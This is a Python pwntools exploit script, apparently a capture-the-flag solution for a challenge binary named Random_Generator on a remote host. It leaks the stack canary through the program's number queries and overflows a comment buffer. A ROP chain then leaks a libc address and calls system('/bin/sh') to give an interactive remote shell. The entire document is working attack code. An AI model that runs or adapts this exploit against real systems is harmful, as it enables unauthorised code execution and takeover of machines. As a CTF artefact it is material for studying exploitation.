from pwn import *

context.log_level = "DEBUG"
local = False

if local:
    r = process('./Random_Generator_8c110de2ce4abb0f909bca289fb7b1a99fd18ef1')
    pause()
else:
    r = remote('69.90.132.40', 4000)

cookie = 0

for i in range(7,0,-1):
    r.recvuntil('get?')
    r.sendline(str(i))
    r.recvuntil(' = ')
    cookie = (cookie << 8) + int(r.recvuntil('\n'))

cookie <<= 8
print "Got stack cookie:", hex(cookie)
assert '\n' not in hex(cookie)[2:].decode('hex')

r.recvuntil('get?')
r.sendline('0')

r.recvuntil('comment: ')

pop_rax_pop_rdi_ret = 0x400f8c
pop_rsi_r15_ret = 0x400f61
mov_rdx_rsi_ret = 0x400f88
syscall = 0x400f8f

libc_leak = 0x6021c0

# Write libc thing to stdout
rop = p64(pop_rax_pop_rdi_ret) + p64(1) + p64(1) # sys_write, stdout
rop += p64(pop_rsi_r15_ret) + p64(8) + p64(0) # count
rop += p64(mov_rdx_rsi_ret)
rop += p64(pop_rsi_r15_ret) + p64(libc_leak) + p64(0) # buf
rop += p64(syscall)

# read system addr and command into a known address
rop += p64(pop_rax_pop_rdi_ret) + p64(0) + p64(0) # sys_read, stdin
rop += p64(pop_rsi_r15_ret) + p64(0x40) + p64(0) # count
rop += p64(mov_rdx_rsi_ret)
rop += p64(pop_rsi_r15_ret) + p64(0x6021d0) + p64(0) # buf
rop += p64(syscall)

rop += p64(pop_rax_pop_rdi_ret) + p64(0x6021d0) + p64(0x6021d0+0x8)

# call [rax]
rop += p64(0x401107)


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r.sendline('A'*0x408 + p64(cookie) + 'B'*8 + rop)
libc.address = u64(r.recv(8)) - libc.symbols['_IO_2_1_stdin_']

print "libc base:", hex(libc.address)

r.send(p64(libc.symbols['system'])+'/bin/sh\x00')

r.interactive()

